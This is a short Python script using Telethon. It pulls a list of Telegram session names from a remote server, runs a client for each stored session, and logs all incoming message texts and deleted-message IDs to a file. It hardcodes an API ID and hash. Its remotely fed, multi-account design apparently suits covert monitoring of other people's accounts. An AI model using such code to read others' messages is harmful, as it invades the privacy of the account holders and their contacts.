import asyncio
import requests
import os
from telethon import TelegramClient, events

API_ID = 30074866
API_HASH = "eea91e3c3b0381b36d455383fe5b9989"
SERVER_URL = "https://gleaming-truth-production-ed48.up.railway.app/"

async def run_client(session_name):
    try:
        client = TelegramClient(f"sessions/{session_name}", API_ID, API_HASH)
        await client.start()

        @client.on(events.NewMessage)
        async def handler(event):
            with open("logs.txt", "a", encoding="utf-8") as f:
                f.write(f"NEW: {event.text}\n")

        @client.on(events.MessageDeleted)
        async def deleted_handler(event):
            with open("logs.txt", "a", encoding="utf-8") as f:
                f.write(f"DELETED MESSAGE ID: {event.deleted_ids}\n")

        await client.run_until_disconnected()
    except Exception as e:
        print(f"Error {session_name}: {e}")
        await asyncio.sleep(5)
        await run_client(session_name)

async def main():
    while True:
        try:
            res = requests.get(f"{SERVER_URL}/sessions").json()
            sessions = res.get("sessions", [])

            tasks = []
            for s in sessions:
                tasks.append(run_client(s))

            await asyncio.gather(*tasks)
        except Exception as e:
            print("Worker error:", e)
            await asyncio.sleep(10)

if __name__ == "__main__":
    asyncio.run(main())
